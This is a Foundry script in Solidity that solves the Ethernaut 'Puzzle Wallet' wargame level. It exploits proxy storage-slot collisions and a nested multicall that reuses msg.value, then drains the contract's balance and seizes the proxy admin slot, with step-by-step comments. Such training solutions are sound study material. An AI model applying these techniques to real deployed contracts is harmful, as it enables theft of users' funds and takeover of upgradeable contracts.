// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { PuzzleWallet } from "ethernaut/24-puzzle-wallet/PuzzleWallet.sol";
import { IPuzzleWallet } from "ethernaut/24-puzzle-wallet/IPuzzleWallet.sol";
import { PuzzleWalletAttacker } from "ethernaut/24-puzzle-wallet/PuzzleWalletAttacker.sol";

contract PuzzleWalletScript is Script {
    uint256 private constant PUZZLE_WALLET_BALANCE = 0.001 ether;

    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        address msgCaller = vm.addr(deployerPrivateKey);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address puzzleWalletAddr = vm.envAddress("L24_PUZZLE_WALLET_ADDRESS");
        IPuzzleWallet puzzleWallet = IPuzzleWallet(puzzleWalletAddr);

        // Option 1: deploy attacker
        // PuzzleWalletAttacker puzzleWalletAttacker = new PuzzleWalletAttacker();
        // puzzleWalletAttacker.exploit{value: 0.001 ether}(address(puzzleWallet));

        // Option 2: without an attacker
        // Step1: storage collision 1: `PuzzleWallet.owner` (slot 0) is overriden with our signer address by calling
        // `PuzzleProxy.proposeNewAdmin()`. From no onwards the goal is to call `PuzzleWallet.setMaxBalance()`.
        puzzleWallet.proposeNewAdmin(msgCaller);

        // Step 2: whitelist signer
        puzzleWallet.addToWhitelist(msgCaller);

        // Step 3: bump msg.sender balance to 0.002 ether by exploiting `PuzzleProxy.multicall()`. Bypass the selector
        // check by encoding a multicall()->deposit() call in `data`. This will double msg.sender balance with half
        // msg.value, which allows to withdraw all contract balances.
        bytes memory callDeposit = abi.encodeCall(puzzleWallet.deposit, ());
        bytes[] memory multicallCalls = new bytes[](1);
        multicallCalls[0] = callDeposit;
        bytes memory callMulticall = abi.encodeCall(puzzleWallet.multicall, (multicallCalls));
        bytes[] memory calls = new bytes[](2);
        calls[0] = callDeposit;
        calls[1] = callMulticall;
        puzzleWallet.multicall{value: PUZZLE_WALLET_BALANCE}(calls);

        // Step 4: withdraw all contract balances (0.002 ether)
        puzzleWallet.execute(msgCaller, address(puzzleWallet).balance, "");

        // Step 5: storage collision 2: `PuzzleProxy.admin` (slot 1) is overriden with our signer address by calling
        // `PuzzleWallet.setMaxBalance()` with our address casted as uint256
        puzzleWallet.setMaxBalance(uint256(bytes32(abi.encode(msgCaller))));

        vm.stopBroadcast();
    }
}
